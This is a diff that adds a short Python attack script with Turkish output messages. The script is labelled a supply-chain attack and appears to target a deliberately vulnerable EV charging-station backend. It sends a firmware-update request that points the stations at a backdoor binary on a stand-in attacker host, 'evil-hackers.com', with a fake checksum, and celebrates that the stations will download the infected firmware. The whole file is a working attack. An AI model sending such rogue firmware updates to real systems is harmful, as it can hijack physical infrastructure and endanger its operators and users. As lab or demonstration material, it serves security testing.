@@ -1,0 +1,33 @@
+import requests
+
+BACKEND = "https://evcs-backend-samet.onrender.com"
+
+print("📦 SUPPLY CHAIN SALDIRISI (DÜZELTİLMİŞ VERSİYON)\n")
+
+malicious_url = "http://evil-hackers.com/updates/firmware_v2_BACKDOOR.bin"
+
+payload = {
+    "firmware_url": "http://evil-hackers.com/backdoor.bin",
+    "version": "2.0.0",
+    "checksum": "fake",
+}
+
+print(f"Hedef URL: {malicious_url}")
+print("Güncelleme emri gönderiliyor...")
+
+r = requests.post(f"{BACKEND}/vulnerable/firmware-update", params=payload)
+
+print(f"Sunucu Yanıt Kodu: {r.status_code}")
+
+try:
+    result = r.json()
+    print(f"\nSonuç: {result}")
+
+    if "malicious_potential" in result or result.get("status") == "update_initiated":
+        print("\n✅✅✅ BAŞARILI! Zararlı yazılım kabul edildi! ✅✅✅")
+        print("İstasyonlar şimdi virüslü yazılımı indiriyor...")
+    else:
+        print("\n⚠️ Saldırı başarılı olmadı, dönen mesajı kontrol et.")
+        
+except Exception as e:
+    print(f"\n❌ JSON hatası veya başka bir sorun: {r.text}")
